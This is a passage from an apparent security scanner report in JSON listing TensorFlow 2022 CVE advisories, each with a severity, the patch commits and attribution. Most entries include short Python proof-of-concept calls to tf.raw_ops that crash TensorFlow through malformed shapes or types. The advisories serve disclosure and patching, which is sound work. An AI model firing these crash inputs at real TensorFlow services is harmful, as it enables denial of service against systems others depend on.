                "text": "Vulnerability CVE-2022-35993\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-35993](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35993)\n### Impact\nWhen `SetSize` receives an input `set_shape` that is not a 1D tensor, it gives a `CHECK` fails that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\narg_0=1\narg_1=[1,1]\narg_2=1\narg_3=True\narg_4=``\ntf.raw_ops.SetSize(set_indices=arg_0, set_values=arg_1, set_shape=arg_2,\n                   validate_indices=arg_3, name=arg_4)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [cf70b79d2662c0d3c6af74583641e345fc939467](https://github.com/tensorflow/tensorflow/commit/cf70b79d2662c0d3c6af74583641e345fc939467).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by 刘力源, Information System \u0026 Security and Countermeasures Experiments Center, Beijing Institute of Technology.\n",
                "markdown": "**Vulnerability CVE-2022-35993**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-35993](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35993)|\n\n### Impact\nWhen `SetSize` receives an input `set_shape` that is not a 1D tensor, it gives a `CHECK` fails that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\narg_0=1\narg_1=[1,1]\narg_2=1\narg_3=True\narg_4=``\ntf.raw_ops.SetSize(set_indices=arg_0, set_values=arg_1, set_shape=arg_2,\n                   validate_indices=arg_3, name=arg_4)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [cf70b79d2662c0d3c6af74583641e345fc939467](https://github.com/tensorflow/tensorflow/commit/cf70b79d2662c0d3c6af74583641e345fc939467).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by 刘力源, Information System \u0026 Security and Countermeasures Experiments Center, Beijing Institute of Technology.\n"
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-36018",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-36018"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36018",
              "help": {
                "text": "Vulnerability CVE-2022-36018\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-36018](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36018)\n### Impact\nIf `RaggedTensorToVariant` is given a `rt_nested_splits` list that contains tensors of ranks other than one, it results in a `CHECK` fail that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\n\nbatched_input = True\nrt_nested_splits = tf.constant([0,32,64], shape=[3], dtype=tf.int64)\nrt_dense_values = tf.constant([0,32,64], shape=[3], dtype=tf.int64)\ntf.raw_ops.RaggedTensorToVariant(rt_nested_splits=rt_nested_splits, rt_dense_values=rt_dense_values, batched_input=batched_input)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [88f93dfe691563baa4ae1e80ccde2d5c7a143821](https://github.com/tensorflow/tensorflow/commit/88f93dfe691563baa4ae1e80ccde2d5c7a143821).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.\n",
                "markdown": "**Vulnerability CVE-2022-36018**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-36018](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36018)|\n\n### Impact\nIf `RaggedTensorToVariant` is given a `rt_nested_splits` list that contains tensors of ranks other than one, it results in a `CHECK` fail that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\n\nbatched_input = True\nrt_nested_splits = tf.constant([0,32,64], shape=[3], dtype=tf.int64)\nrt_dense_values = tf.constant([0,32,64], shape=[3], dtype=tf.int64)\ntf.raw_ops.RaggedTensorToVariant(rt_nested_splits=rt_nested_splits, rt_dense_values=rt_dense_values, batched_input=batched_input)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [88f93dfe691563baa4ae1e80ccde2d5c7a143821](https://github.com/tensorflow/tensorflow/commit/88f93dfe691563baa4ae1e80ccde2d5c7a143821).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.\n"
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-35984",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-35984"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35984",
              "help": {
                "text": "Vulnerability CVE-2022-35984\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-35984](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35984)\n### Impact\n`ParameterizedTruncatedNormal` assumes `shape` is of type `int32`. A valid `shape` of type `int64` results in a mismatched type `CHECK` fail that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\nseed = 1618\nseed2 = 0\nshape = tf.random.uniform(shape=[3], minval=-10000, maxval=10000, dtype=tf.int64, seed=4894)\nmeans = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)\nstdevs = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)\nminvals = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)\nmaxvals = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)\ntf.raw_ops.ParameterizedTruncatedNormal(shape=shape, means=means, stdevs=stdevs, minvals=minvals, maxvals=maxvals, seed=seed, seed2=seed2)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [72180be03447a10810edca700cbc9af690dfeb51](https://github.com/tensorflow/tensorflow/commit/72180be03447a10810edca700cbc9af690dfeb51).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Di Jin, Secure Systems Labs, Brown University\n",
                "markdown": "**Vulnerability CVE-2022-35984**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-35984](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35984)|\n\n### Impact\n`ParameterizedTruncatedNormal` assumes `shape` is of type `int32`. A valid `shape` of type `int64` results in a mismatched type `CHECK` fail that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\nseed = 1618\nseed2 = 0\nshape = tf.random.uniform(shape=[3], minval=-10000, maxval=10000, dtype=tf.int64, seed=4894)\nmeans = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)\nstdevs = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)\nminvals = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)\nmaxvals = tf.random.uniform(shape=[3, 3, 3], minval=-10000, maxval=10000, dtype=tf.float32, seed=-2971)\ntf.raw_ops.ParameterizedTruncatedNormal(shape=shape, means=means, stdevs=stdevs, minvals=minvals, maxvals=maxvals, seed=seed, seed2=seed2)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [72180be03447a10810edca700cbc9af690dfeb51](https://github.com/tensorflow/tensorflow/commit/72180be03447a10810edca700cbc9af690dfeb51).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Di Jin, Secure Systems Labs, Brown University\n"
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-35937",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-35937"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35937",
              "help": {
                "text": "Vulnerability CVE-2022-35937\nSeverity: high\nFixed Version: 2.9.1\nLink: [CVE-2022-35937](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35937)\n### Impact\nThe [`GatherNd`](https://github.com/tensorflow/tensorflow/blob/f463040eb3997e42e60a2ffc6dc72de7ef11dbb4/tensorflow/lite/kernels/gather_nd.cc#L105-L111) function takes arguments that determine the sizes of inputs and outputs. If the inputs given are greater than or equal to the sizes of the outputs, an out-of-bounds memory read is triggered.\n\n### Patches\nWe have patched the issue in GitHub commit [595a65a3e224a0362d7e68c2213acfc2b499a196](https://github.com/tensorflow/tensorflow/commit/595a65a3e224a0362d7e68c2213acfc2b499a196).\n\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Hui Peng from Baidu Security.\n",
                "markdown": "**Vulnerability CVE-2022-35937**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.9.1|[CVE-2022-35937](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35937)|\n\n### Impact\nThe [`GatherNd`](https://github.com/tensorflow/tensorflow/blob/f463040eb3997e42e60a2ffc6dc72de7ef11dbb4/tensorflow/lite/kernels/gather_nd.cc#L105-L111) function takes arguments that determine the sizes of inputs and outputs. If the inputs given are greater than or equal to the sizes of the outputs, an out-of-bounds memory read is triggered.\n\n### Patches\nWe have patched the issue in GitHub commit [595a65a3e224a0362d7e68c2213acfc2b499a196](https://github.com/tensorflow/tensorflow/commit/595a65a3e224a0362d7e68c2213acfc2b499a196).\n\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Hui Peng from Baidu Security.\n"
              },
              "properties": {
                "security-severity": "7.0",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2022-35965",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-35965"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35965",
              "help": {
                "text": "Vulnerability CVE-2022-35965\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-35965](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35965)\n### Impact\nIf `LowerBound` or `UpperBound` is given an empty`sorted_inputs` input, it results in a `nullptr` dereference, leading to a segfault that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\n\nout_type = tf.int32\nsorted_inputs = tf.constant([], shape=[10,0], dtype=tf.float32)\nvalues = tf.constant([], shape=[10,10,0,10,0], dtype=tf.float32)\ntf.raw_ops.LowerBound(sorted_inputs=sorted_inputs, values=values, out_type=out_type)\n```\n```python\nimport tensorflow as tf\n\nout_type = tf.int64\nsorted_inputs = tf.constant([], shape=[2,2,0,0,0,0,0,2], dtype=tf.float32)\nvalues = tf.constant(0.372660398, shape=[2,4], dtype=tf.float32)\ntf.raw_ops.UpperBound(sorted_inputs=sorted_inputs, values=values, out_type=out_type)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [bce3717eaef4f769019fd18e990464ca4a2efeea](https://github.com/tensorflow/tensorflow/commit/bce3717eaef4f769019fd18e990464ca4a2efeea).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.",
                "markdown": "**Vulnerability CVE-2022-35965**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-35965](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35965)|\n\n### Impact\nIf `LowerBound` or `UpperBound` is given an empty`sorted_inputs` input, it results in a `nullptr` dereference, leading to a segfault that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\n\nout_type = tf.int32\nsorted_inputs = tf.constant([], shape=[10,0], dtype=tf.float32)\nvalues = tf.constant([], shape=[10,10,0,10,0], dtype=tf.float32)\ntf.raw_ops.LowerBound(sorted_inputs=sorted_inputs, values=values, out_type=out_type)\n```\n```python\nimport tensorflow as tf\n\nout_type = tf.int64\nsorted_inputs = tf.constant([], shape=[2,2,0,0,0,0,0,2], dtype=tf.float32)\nvalues = tf.constant(0.372660398, shape=[2,4], dtype=tf.float32)\ntf.raw_ops.UpperBound(sorted_inputs=sorted_inputs, values=values, out_type=out_type)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [bce3717eaef4f769019fd18e990464ca4a2efeea](https://github.com/tensorflow/tensorflow/commit/bce3717eaef4f769019fd18e990464ca4a2efeea).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University."
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-35998",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-35998"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35998",
              "help": {
                "text": "Vulnerability CVE-2022-35998\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-35998](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35998)\n### Impact\nIf `EmptyTensorList` receives an input `element_shape` with more than one dimension, it gives a `CHECK` fail that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\n\ntf.raw_ops.EmptyTensorList(element_shape=tf.ones(dtype=tf.int32, shape=[1, 0]), max_num_elements=tf.constant(1),element_dtype=tf.int32)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [c8ba76d48567aed347508e0552a257641931024d](https://github.com/tensorflow/tensorflow/commit/c8ba76d48567aed347508e0552a257641931024d).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Kang Hong Jin.\n",
                "markdown": "**Vulnerability CVE-2022-35998**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-35998](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35998)|\n\n### Impact\nIf `EmptyTensorList` receives an input `element_shape` with more than one dimension, it gives a `CHECK` fail that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\n\ntf.raw_ops.EmptyTensorList(element_shape=tf.ones(dtype=tf.int32, shape=[1, 0]), max_num_elements=tf.constant(1),element_dtype=tf.int32)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [c8ba76d48567aed347508e0552a257641931024d](https://github.com/tensorflow/tensorflow/commit/c8ba76d48567aed347508e0552a257641931024d).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Kang Hong Jin.\n"
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-35941",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-35941"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35941",
              "help": {
                "text": "Vulnerability CVE-2022-35941\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-35941](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35941)\n### Impact\nThe [`AvgPoolOp`](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/avgpooling_op.cc#L56-L98) function takes an argument `ksize` that must be positive but is not checked. A negative `ksize` can trigger a `CHECK` failure and crash the program.\n```python\nimport tensorflow as tf\nimport numpy as np\n\nvalue = np.ones([1, 1, 1, 1])\nksize = [1, 1e20, 1, 1]\nstrides = [1, 1, 1, 1]\npadding = `SAME`\ndata_format = `NHWC`\n\ntf.raw_ops.AvgPool(value=value, ksize=ksize, strides=strides, padding=padding, data_format=data_format)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [3a6ac52664c6c095aa2b114e742b0aa17fdce78f](https://github.com/tensorflow/tensorflow/commit/3a6ac52664c6c095aa2b114e742b0aa17fdce78f).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Jingyi Shi.\n",
                "markdown": "**Vulnerability CVE-2022-35941**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-35941](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35941)|\n\n### Impact\nThe [`AvgPoolOp`](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/avgpooling_op.cc#L56-L98) function takes an argument `ksize` that must be positive but is not checked. A negative `ksize` can trigger a `CHECK` failure and crash the program.\n```python\nimport tensorflow as tf\nimport numpy as np\n\nvalue = np.ones([1, 1, 1, 1])\nksize = [1, 1e20, 1, 1]\nstrides = [1, 1, 1, 1]\npadding = `SAME`\ndata_format = `NHWC`\n\ntf.raw_ops.AvgPool(value=value, ksize=ksize, strides=strides, padding=padding, data_format=data_format)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [3a6ac52664c6c095aa2b114e742b0aa17fdce78f](https://github.com/tensorflow/tensorflow/commit/3a6ac52664c6c095aa2b114e742b0aa17fdce78f).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Jingyi Shi.\n"
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-35986",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-35986"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35986",
              "help": {
                "text": "Vulnerability CVE-2022-35986\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-35986](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35986)\n### Impact\nIf `RaggedBincount` is given an empty input tensor `splits`, it results in a segfault that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\nbinary_output = True\nsplits = tf.random.uniform(shape=[0], minval=-10000, maxval=10000, dtype=tf.int64, seed=-7430)\nvalues = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.int32, seed=-10000)\nsize = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.int32, seed=-10000)\nweights = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.float32, seed=-10000)\ntf.raw_ops.RaggedBincount(splits=splits, values=values, size=size, weights=weights, binary_output=binary_output)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [7a4591fd4f065f4fa903593bc39b2f79530a74b8](https://github.com/tensorflow/tensorflow/commit/7a4591fd4f065f4fa903593bc39b2f79530a74b8).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Di Jin, Secure Systems Labs, Brown University\n",
                "markdown": "**Vulnerability CVE-2022-35986**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-35986](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35986)|\n\n### Impact\nIf `RaggedBincount` is given an empty input tensor `splits`, it results in a segfault that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\nbinary_output = True\nsplits = tf.random.uniform(shape=[0], minval=-10000, maxval=10000, dtype=tf.int64, seed=-7430)\nvalues = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.int32, seed=-10000)\nsize = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.int32, seed=-10000)\nweights = tf.random.uniform(shape=[], minval=-10000, maxval=10000, dtype=tf.float32, seed=-10000)\ntf.raw_ops.RaggedBincount(splits=splits, values=values, size=size, weights=weights, binary_output=binary_output)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [7a4591fd4f065f4fa903593bc39b2f79530a74b8](https://github.com/tensorflow/tensorflow/commit/7a4591fd4f065f4fa903593bc39b2f79530a74b8).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Di Jin, Secure Systems Labs, Brown University\n"
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-36017",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-36017"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36017",
              "help": {
                "text": "Vulnerability CVE-2022-36017\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-36017](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36017)\n### Impact\nIf `Requantize` is given `input_min`, `input_max`, `requested_output_min`, `requested_output_max` tensors of a nonzero rank, it results in a segfault that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\n\nout_type = tf.quint8\ninput = tf.constant([1], shape=[3], dtype=tf.qint32)\ninput_min = tf.constant([], shape=[0], dtype=tf.float32)\ninput_max = tf.constant(-256, shape=[1], dtype=tf.float32)\nrequested_output_min = tf.constant(-256, shape=[1], dtype=tf.float32)\nrequested_output_max = tf.constant(-256, shape=[1], dtype=tf.float32)\ntf.raw_ops.Requantize(input=input, input_min=input_min, input_max=input_max, requested_output_min=requested_output_min, requested_output_max=requested_output_max, out_type=out_type)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [785d67a78a1d533759fcd2f5e8d6ef778de849e0](https://github.com/tensorflow/tensorflow/commit/785d67a78a1d533759fcd2f5e8d6ef778de849e0).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.\n",
                "markdown": "**Vulnerability CVE-2022-36017**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-36017](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36017)|\n\n### Impact\nIf `Requantize` is given `input_min`, `input_max`, `requested_output_min`, `requested_output_max` tensors of a nonzero rank, it results in a segfault that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\n\nout_type = tf.quint8\ninput = tf.constant([1], shape=[3], dtype=tf.qint32)\ninput_min = tf.constant([], shape=[0], dtype=tf.float32)\ninput_max = tf.constant(-256, shape=[1], dtype=tf.float32)\nrequested_output_min = tf.constant(-256, shape=[1], dtype=tf.float32)\nrequested_output_max = tf.constant(-256, shape=[1], dtype=tf.float32)\ntf.raw_ops.Requantize(input=input, input_min=input_min, input_max=input_max, requested_output_min=requested_output_min, requested_output_max=requested_output_max, out_type=out_type)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [785d67a78a1d533759fcd2f5e8d6ef778de849e0](https://github.com/tensorflow/tensorflow/commit/785d67a78a1d533759fcd2f5e8d6ef778de849e0).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.\n"
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-36026",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-36026"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36026",
              "help": {
